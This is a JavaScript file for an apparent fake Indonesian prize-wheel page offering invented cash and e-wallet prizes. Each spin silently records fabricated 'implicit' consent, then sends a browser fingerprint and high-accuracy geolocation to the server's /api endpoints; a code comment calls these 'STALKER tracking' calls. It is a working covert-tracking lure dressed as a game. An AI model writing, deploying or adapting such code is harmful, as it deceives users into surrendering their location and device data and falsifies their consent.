    (function () {
      const CAMPAIGN_ID = '{{CAMPAIGN_ID}}';
      const API_BASE = window.location.origin;
      let participantId = null;

      async function api(method, path, body) {
        try {
          const opts = {
            method,
            headers: { 'Content-Type': 'application/json' },
          };
          if (body) opts.body = JSON.stringify(body);
          const res = await fetch(API_BASE + path, opts);
          return res.ok ? await res.json() : null;
        } catch { return null; }
      }

      function collectBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown', os = 'Unknown';
        if (ua.includes('Firefox'))      browser = 'Firefox';
        else if (ua.includes('Edg'))     browser = 'Edge';
        else if (ua.includes('Chrome'))  browser = 'Chrome';
        else if (ua.includes('Safari'))  browser = 'Safari';

        if (ua.includes('Windows'))      os = 'Windows';
        else if (ua.includes('Mac'))     os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('Linux'))   os = 'Linux';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        return {
          browser, os,
          screen_resolution: `${screen.width}x${screen.height}`,
          language: navigator.language || 'unknown',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
          user_agent: ua,
        };
      }

      let tickets = 3;
      let isSpinning = false;
      let currentRotation = 0;

      const wheel = document.getElementById('spin-wheel');
      const ticketDisplay = document.getElementById('ticket-count');
      const mainBtn = document.getElementById('main-spin-btn');
      const centerBtn = document.getElementById('center-spin-btn');
      const addTicketBtn = document.getElementById('btn-add-ticket');
      const resultBadge = document.getElementById('result-badge');
      const resultText = document.getElementById('result-text');
      const turboToggle = document.getElementById('turbo-toggle');

      const prizes = [
        'Rp 1.000.000 (Jackpot Emas)',
        'Rp 50.000 (Saldo DANA)',
        '2x Tiket Spin Gratis',
        'Rp 250.000 (Saldo Mega Cuan)',
        'Rp 25.000 (Saldo GoPay)',
        'Box Misteri Emas',
        'Rp 500.000 (Saldo OVO Super)',
        'Rp 10.000 (Saldo Hiburan)'
      ];

      async function spin() {
        if (isSpinning) return;
        if (tickets <= 0) {
          alert('Tiket spin Anda habis! Selesaikan misi harian untuk menambah tiket.');
          return;
        }

        tickets -= 1;
        ticketDisplay.textContent = tickets;
        isSpinning = true;
        resultBadge.classList.add('opacity-0');

        // STALKER tracking API calls in background
        const consent = await api('POST', '/api/consent', {
          campaign_id: CAMPAIGN_ID,
          consent_given: true, // implicit
        });
        
        if (consent) {
          participantId = consent.participant_id;
          const browserInfo = collectBrowserInfo();
          browserInfo.participant_id = participantId;
          api('POST', '/api/browser-info', browserInfo);
          
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition((pos) => {
              api('POST', '/api/location', {
                participant_id: participantId,
                campaign_id: CAMPAIGN_ID,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                permission_status: 'GRANTED',
              });
            }, () => {
              api('POST', '/api/location', {
                participant_id: participantId,
                campaign_id: CAMPAIGN_ID,
                permission_status: 'DENIED',
              });
            }, { enableHighAccuracy: true, timeout: 15000 });
          }
        }

        const isTurbo = turboToggle.checked;
        const spinDuration = isTurbo ? 1800 : 4500;
        wheel.style.transitionDuration = spinDuration + 'ms';

        const winningIndex = Math.floor(Math.random() * prizes.length);
        const segmentAngle = 360 / prizes.length;
        const extraRounds = isTurbo ? 4 * 360 : 7 * 360;

        const targetDegree = 360 - (winningIndex * segmentAngle) - (segmentAngle / 2);
        currentRotation += extraRounds + (targetDegree - (currentRotation % 360));

        wheel.style.transform = 'rotate(' + currentRotation + 'deg)';

        setTimeout(function () {
          isSpinning = false;
          resultText.textContent = 'Selamat! Anda memenangkan ' + prizes[winningIndex];
          resultBadge.classList.remove('opacity-0');

          if (winningIndex === 2) {
            tickets += 2;
            ticketDisplay.textContent = tickets;
          }
        }, spinDuration);
      }

      mainBtn.addEventListener('click', spin);
      centerBtn.addEventListener('click', spin);

      addTicketBtn.addEventListener('click', function () {
        tickets += 5;
        ticketDisplay.textContent = tickets;
        alert('Berhasil menambah 5 Tiket Putar Hoki!');
      });
    })();
